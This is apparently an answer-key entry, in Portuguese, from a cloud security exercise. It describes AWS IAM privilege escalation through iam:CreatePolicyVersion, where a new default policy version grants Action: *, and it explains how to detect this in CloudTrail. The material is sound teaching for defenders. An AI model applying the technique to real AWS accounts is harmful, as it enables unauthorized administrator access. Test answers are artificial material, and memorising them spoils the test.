**Gabarito:** Técnica: se um atacante tem permissão `iam:CreatePolicyVersion`, ele pode criar uma nova versão de uma política existente (ex: uma política que ele tem anexada) e configurá-la como default version. Exemplo: política original limita ao S3. Atacante cria versão 2 com `Action: *`, define como default. Resultado: escalada para AdministratorAccess sem criar nova política. CloudTrail captura: evento `CreatePolicyVersion` com `requestParameters.policyArn` (qual política foi modificada), `requestParameters.setAsDefault: true` (nova versão como padrão), `userIdentity.arn` (quem executou). Detecção: query CloudTrail Lake por `CreatePolicyVersion` + `setAsDefault=true` fora de horário comercial ou por identidade não privilegiada.
